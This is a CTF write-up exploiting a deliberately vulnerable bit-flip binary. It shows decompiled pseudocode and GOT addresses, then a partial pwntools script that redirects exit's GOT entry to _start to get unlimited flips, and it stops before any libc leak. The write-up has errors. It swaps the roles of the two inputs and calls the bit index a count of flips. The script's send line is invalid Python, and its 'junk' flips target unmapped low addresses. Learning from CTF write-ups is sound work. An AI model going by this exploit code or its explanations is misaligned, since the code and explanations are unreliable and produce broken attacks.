# Bit flipping: Pwning

This was quite an interesting challenge because there's a logic bug in this challenge which was there intentionally(?). In this challenge the binary allow you to do a bit flipping of a address and we have to cleverly choose the address and exactly how many bits we want to flip. Without further ado, let's move:-

##### `main` function pseudocode

The `main` function prints `buf`(?) and then calls `do_flip` 5 times and then exits.

> `buf` is not defined in the `main` function.

```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  signed int v3; // [rsp+18h] [rbp-8h]

  puts(buf);
  v3 = 0;
  printf("I'll let you flip 5 bits, but that's it!\n", argv);
  while ( v3 < 5 )
  {
    do_flip();
    ++v3;
  }
  printf("Thank you for flipping us off!\nHave a nice day :)\n");
  exit(0);
}
```
##### `initialie` function pseudocode


The `buf` is getting initialized by `uptime` which gets printed by the `sprintf` using the variable `format`. Now, this seems quite understandable since `initialize` will setup the buf which is called in `_start` before `main`. 

```C
int initialize()
{
  struct tm *v0; // rax
  char *format; // ST10_8
  char *v2; // rax
  time_t timer; // [rsp+40h] [rbp-10h]
  unsigned __int64 v5; // [rsp+48h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  timer = time(0LL);
  v0 = localtime(&timer);
  format = welcome_str;
  v2 = asctime(v0);
  return snprintf(buf, 0x7FuLL, format, v2);
}
```

#### Disassembly of `do_flip`

This is the function which will flip the address by `n` bits.

```C
unsigned __int64 do_flip()
{
  unsigned int v1; // [rsp+Ch] [rbp-14h]
  _BYTE *v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Enter addr:bit to flip: ");
  __isoc99_fscanf(stdin, "%p:%u", &v2, &v1);
  if ( v1 > 7 )
    exit(1);
  *v2 ^= 1 << v1;
  return __readfsqword(0x28u);
}
```

It takes 2 input via scanf, one being a hex formatted address and second being the amount of times we want to  flip that address. 

* `v1`: This will be the address.
* `v2` : This will be the number of times we want to flip that address.

##### Pwning time

Now, 5 times is not enough to do something cleverish and useful, so first we need to overwrite any GOT which is being called after the function exits, the only funtion which is called after `do_flip` done executing is `exit` and `printf`.

Firstly, let's get the GOT address of all the functions:-

```r
[0x601018] localtime@GLIBC_2.2.5  →  0x4006c6
[0x601020] __isoc99_fscanf@GLIBC_2.7  →  0x4006d6
[0x601028] puts@GLIBC_2.2.5  →  0x4006e6
[0x601030] __stack_chk_fail@GLIBC_2.4  →  0x4006f6
[0x601038] asctime@GLIBC_2.2.5  →  0x400706
[0x601040] printf@GLIBC_2.2.5  →  0x400716
[0x601048] snprintf@GLIBC_2.2.5  →  0x400726
[0x601050] alarm@GLIBC_2.2.5  →  0x400736
[0x601058] time@GLIBC_2.2.5  →  0x400746
[0x601060] setvbuf@GLIBC_2.2.5  →  0x400756
[0x601068] exit@GLIBC_2.2.5  →  0x400766
```

Address of `_start` and `main`:-

```r
gef➤  p _start
$3 = {<text variable, no debug info>} 0x400770 <_start>
gef➤  p main
$4 = {<text variable, no debug info>} 0x400940 <main>
```

Let's see the bit representation of `exit.got`, `main` and `_start`:-


```py
>>> main = 0x400940
>>> start = 0x400770
>>> exit = 0x400766
>>> bin(main)[2:]
'10000000000100101000000'
>>> bin(start)[2:]
'10000000000011101110000'
>>> bin(exit)[2:]
'10000000000011101100110'
```

The one which is closed to `exit` is `_start` which requires only 3 bit flips to change the address and make the `exit` points to `_start`.

```py
>>> bin(exit)[2:]
'10000000000011101100110'
>>> bin(start)[2:]
'10000000000011101110000'
>>> exit ^= 1 << 1
>>> exit ^= 1 << 2
>>> exit ^= 1 << 4
>>> bin(exit)[2:]
'10000000000011101110000'
>>> bin(start)[2:]
'10000000000011101110000'
```

Great, now since we can change the `exit` address with `_start` address we can get infinte amount of flips. What we need to do now is somehow find a way to leak any libc address. Let's get on work:-

Firstly, let's try to make a skeleton script which will be the base for exploit:-

```py
from pwn import *

elf = ELF("flip")

exit_got = elf.got['exit']

def flip(address, bits):
	p.sendlineafter(": %s:%d", %(address, bits))

p = process(elf.path)

flip(exit_got, 1)
flip(exit_got, 2)
flip(exit_got, 4)
flip(0x44, 2)  # junk
flip(0x11, 2)  # junk

p.interactive()```
